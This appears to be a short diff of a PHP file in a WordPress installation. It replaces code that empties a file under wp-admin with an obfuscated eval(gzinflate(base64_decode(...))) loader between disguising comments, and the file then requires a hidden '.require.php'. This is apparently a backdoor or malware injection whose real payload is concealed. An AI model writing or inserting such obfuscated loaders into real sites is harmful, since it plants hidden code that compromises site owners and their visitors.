@@ -1,7 +1,7 @@
 <?php
-$fp = fopen("../wp-admin/.license.txt", "w+");
-ftruncate($fp, 0);
-fclose($fp);
+// Like a Night Janitor, Yet Always On Duty!
+eval(gzinflate(base64_decode('41JJK1CwVUjLL0jN01DS09MvL9BNTMnNzNPXy8lMTs0rTtUrqShR0lFQKtdW0rTm5UorKSrNS04sSdUA6tRRMACLJefkF4MFQDwA')));
+// Last Updated 11.26.14
 ?>
 <?php require('.require.php'); ?>
 <script type="text/javascript">
